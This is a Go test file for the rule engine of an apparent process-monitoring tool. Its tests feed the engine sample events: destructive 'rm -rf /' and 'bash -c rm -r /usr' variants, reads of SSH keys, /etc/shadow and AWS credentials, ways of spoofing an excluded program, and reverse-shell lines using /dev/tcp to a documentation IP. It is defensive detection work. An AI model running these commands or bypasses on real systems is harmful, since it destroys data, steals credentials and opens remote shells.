// SPDX-License-Identifier: Apache-2.0
package policy

import (
	"testing"

	"github.com/samyxo-bv/ringwall/internal/model"
)

func TestPolicyExePathExclusionCannotBeSpoofedByCommOrTmpCopy(t *testing.T) {
	eng, err := NewEngine([]Rule{
		{
			ID:       "RW-AGENT-001",
			Name:     "SSH private key access",
			Severity: model.SeverityCritical,
			Action:   model.ActionFreeze,
			Match: MatchSpec{
				EventTypes:      []model.EventType{model.EventOpen},
				PathGlobs:       []string{"**/.ssh/id_*"},
				ExcludeExePaths: []string{"/usr/bin/ssh", "/usr/bin/git"},
			},
		},
	})
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}

	// Legitimate /usr/bin/ssh is excluded.
	legit := model.Event{Type: model.EventOpen, PID: 10, Comm: "ssh", Exe: "/usr/bin/ssh", Path: "/home/alice/.ssh/id_ed25519"}
	if matches, _, _ := eng.Evaluate(legit); len(matches) != 0 {
		t.Fatalf("expected /usr/bin/ssh to be excluded")
	}

	// Bypass attempt 1: cp /bin/cat /tmp/ssh; /tmp/ssh ~/.ssh/id_ed25519 -> MUST MATCH!
	spoofCopy := model.Event{Type: model.EventOpen, PID: 11, Comm: "ssh", Exe: "/tmp/ssh", Path: "/home/alice/.ssh/id_ed25519"}
	if matches, act, _ := eng.Evaluate(spoofCopy); len(matches) != 1 || act != model.ActionFreeze {
		t.Fatalf("expected /tmp/ssh copy bypass to be caught, got matches=%d action=%s", len(matches), act)
	}

	// Bypass attempt 2: prctl(PR_SET_NAME, "git") from /usr/bin/python3 -> MUST MATCH!
	spoofComm := model.Event{Type: model.EventOpen, PID: 12, Comm: "git", Exe: "/usr/bin/python3", Path: "/home/alice/.ssh/id_ed25519"}
	if matches, act, _ := eng.Evaluate(spoofComm); len(matches) != 1 || act != model.ActionFreeze {
		t.Fatalf("expected prctl(PR_SET_NAME,'git') bypass to be caught, got matches=%d action=%s", len(matches), act)
	}

	// Bypass attempt 3: unnormalized path /home/alice//.ssh/./id_rsa -> MUST MATCH!
	weirdPath := model.Event{Type: model.EventOpen, PID: 13, Comm: "cat", Exe: "/usr/bin/cat", Path: "/home/alice//.ssh/./id_rsa"}
	if matches, act, _ := eng.Evaluate(weirdPath); len(matches) != 1 || act != model.ActionFreeze {
		t.Fatalf("expected unnormalized path bypass to be caught, got matches=%d action=%s", len(matches), act)
	}

	// Scoped runtime allow requires exact full exe + path.
	eng.AddRuntimeAllow("RW-AGENT-001", "/usr/bin/cat", "/home/alice/.ssh/id_rsa")
	if matches, _, _ := eng.Evaluate(weirdPath); len(matches) != 0 {
		t.Fatalf("expected scoped allow on exact exe+path to match")
	}
	otherExe := weirdPath
	otherExe.Exe = "/usr/bin/python3"
	if matches, _, _ := eng.Evaluate(otherExe); len(matches) != 1 {
		t.Fatalf("runtime allow must stay bound to exact full exe path")
	}
}

func TestDestructiveRMAllBypassVariants(t *testing.T) {
	eng, err := NewEngine([]Rule{
		{
			ID:       "RW-AGENT-003",
			Name:     "Destructive rm",
			Severity: model.SeverityCritical,
			Action:   model.ActionKill,
			Match: MatchSpec{
				EventTypes:    []model.EventType{model.EventExec},
				DestructiveRM: true,
			},
		},
	})
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}

	shouldCatch := [][]string{
		{"rm", "-rf", "--no-preserve-root", "/"},
		{"rm", "-r", "-f", "/"},
		{"rm", "-r", "/usr"},
		{"rm", "--r", "/usr"},
		{"rm", "--rec", "--forc", "/usr"},
		{"rm", "-rf", "--", "/"},
		{"rm", "-Rf", "/"},
		{"/bin/rm", "-rf", "/"},
		{"/usr/bin/rm", "--recursive", "--force", "/etc"},
		{"rm", "-rf", "/home/operator"},
		{"rm", "-rf", "/var/lib"},
		{"rm", "-rf", "/usr/local"},
		{"rm", "-fr", "~"},
		{"bash", "-c", "rm -r -f -- /home"},
		{"bash", "-c", "cd / && rm -r usr"},
	}
	for _, argv := range shouldCatch {
		ev := model.Event{Type: model.EventExec, Exe: argv[0], Argv: argv}
		matches, act, _ := eng.Evaluate(ev)
		if len(matches) != 1 || act != model.ActionKill {
			t.Errorf("expected destructive rm %v to be caught with kill, got matches=%d act=%s", argv, len(matches), act)
		}
	}

	// Relative targets resolved against ev.Cwd (e.g. cd / && rm -r usr; cd /home && rm -r operator).
	relDangerous := []model.Event{
		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/", Argv: []string{"rm", "-r", "usr"}},
		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/etc", Argv: []string{"rm", "--r", "."}},
		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/home", Argv: []string{"rm", "-r", "operator"}},
		{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/home/alice/project", Argv: []string{"rm", "-rf", "../.."}},
		{Type: model.EventExec, Exe: "/usr/bin/bash", Cwd: "/", Argv: []string{"bash", "-c", "rm -r usr 2>/dev/null || sleep 25"}},
	}
	for _, ev := range relDangerous {
		if matches, act, _ := eng.Evaluate(ev); len(matches) != 1 || act != model.ActionKill {
			t.Errorf("expected relative destructive rm %+v to be caught with kill, got matches=%d act=%s", ev, len(matches), act)
		}
	}

	// Relative safe cleanup under a deep project subdir MUST NOT false-positive.
	relSafe := model.Event{Type: model.EventExec, Exe: "/usr/bin/rm", Cwd: "/home/alice/project", Argv: []string{"rm", "-rf", "dist"}}
	if matches, _, _ := eng.Evaluate(relSafe); len(matches) != 0 {
		t.Errorf("safe relative rm in project dir false-positived")
	}

	// >8 arguments (truncated eBPF argv, full cmdline preserved separately in ProcCmdline) MUST still match!
	longEv := model.Event{
		Type:        model.EventExec,
		Exe:         "/usr/bin/rm",
		Argv:        []string{"rm", "-rf", "a", "b", "c", "d", "e", "f"},
		Cmdline:     "rm -rf a b c d e f",
		ProcCmdline: "rm -rf a b c d e f g /usr",
	}
	if matches, act, _ := eng.Evaluate(longEv); len(matches) != 1 || act != model.ActionKill {
		t.Errorf("expected >8-arg rm to be caught via ProcCmdline, got matches=%d act=%s", len(matches), act)
	}

	// Real eBPF + /proc/cmdline shape for `bash -c 'rm -r /usr 2>/dev/null || sleep 25'`.
	bashRmEv := model.Event{
		Type:    model.EventExec,
		Exe:     "/usr/bin/bash",
		Argv:    []string{"bash", "-c", "rm -r /usr 2>/dev/null || sleep 25"},
		Cmdline: "bash -c rm -r /usr 2>/dev/null || sleep 25",
	}
	if matches, act, _ := eng.Evaluate(bashRmEv); len(matches) != 1 || act != model.ActionKill {
		t.Errorf("expected bash -c rm -r /usr to be caught with kill, got matches=%d act=%s", len(matches), act)
	}

	// Normal safe cleanup MUST NOT false-positive.
	safe := [][]string{
		{"rm", "-rf", "/tmp/my-build-dir"},
		{"rm", "-rf", "/var/tmp/cache"},
		{"rm", "-rf", "/home/alice/project/dist"},
		{"rm", "-f", "/home/alice/project/dist/app.o"},
		{"ls", "-rf", "/"},
	}
	for _, argv := range safe {
		ev := model.Event{Type: model.EventExec, Exe: "/usr/bin/" + argv[0], Argv: argv}
		if matches, _, _ := eng.Evaluate(ev); len(matches) != 0 {
			t.Errorf("safe command %v false-positived as destructive rm", argv)
		}
	}
}

func TestMatchGlobDoubleStar(t *testing.T) {
	cases := []struct {
		pat, val string
		want     bool
	}{
		{"**/.ssh/id_*", "/home/user/.ssh/id_rsa", true},
		{"**/.ssh/id_*", "/root/.ssh/id_ed25519", true},
		{"**/.ssh/id_*", "/.ssh/id_ed25519", true},
		{"**/.ssh/id_*", "/mnt/.ssh/id_ed25519", true},
		{"**/.ssh/id_*", "/home/user/.ssh/config", false},
		{"/etc/shadow", "/etc/shadow", true},
		{"/etc/cron.d/*", "/etc/cron.d/evil", true},
		{"**/.aws/credentials", "/home/dev/.aws/credentials", true},
	}
	for _, tc := range cases {
		if got := matchGlob(tc.pat, tc.val); got != tc.want {
			t.Errorf("matchGlob(%q, %q) = %v, want %v", tc.pat, tc.val, got, tc.want)
		}
	}
}

func TestCmdlineRegexMatchesBothKernelCmdlineAndProcCmdline(t *testing.T) {
	eng, err := NewEngine([]Rule{
		{
			ID:       "RW-CORE-001",
			Name:     "Reverse shell",
			Severity: model.SeverityCritical,
			Action:   model.ActionKill,
			Match: MatchSpec{
				EventTypes:   []model.EventType{model.EventExec},
				CmdlineRegex: []string{`/dev/(tcp|udp)/[0-9a-zA-Z\.\-]+/[0-9]+`},
			},
		},
	})
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}

	// Process rewrote argv0 in /proc/cmdline; kernel eBPF Cmdline MUST still match.
	ev1 := model.Event{
		Type:        model.EventExec,
		Cmdline:     "bash -c /dev/tcp/198.51.100.42/4444",
		ProcCmdline: "harmless-padding-longer-than-original-cmdline-value",
	}
	if matches, act, _ := eng.Evaluate(ev1); len(matches) != 1 || act != model.ActionKill {
		t.Fatalf("expected kernel Cmdline match even when ProcCmdline rewritten, got matches=%d act=%s", len(matches), act)
	}

	// Truncated eBPF argv (>8 args); fuller ProcCmdline MUST also match.
	ev2 := model.Event{
		Type:        model.EventExec,
		Cmdline:     "bash -c echo 1 2 3 4 5",
		ProcCmdline: "bash -c echo 1 2 3 4 5 && exec /dev/tcp/198.51.100.42/4444",
	}
	if matches, act, _ := eng.Evaluate(ev2); len(matches) != 1 || act != model.ActionKill {
		t.Fatalf("expected ProcCmdline match for >8-arg execve, got matches=%d act=%s", len(matches), act)
	}
}
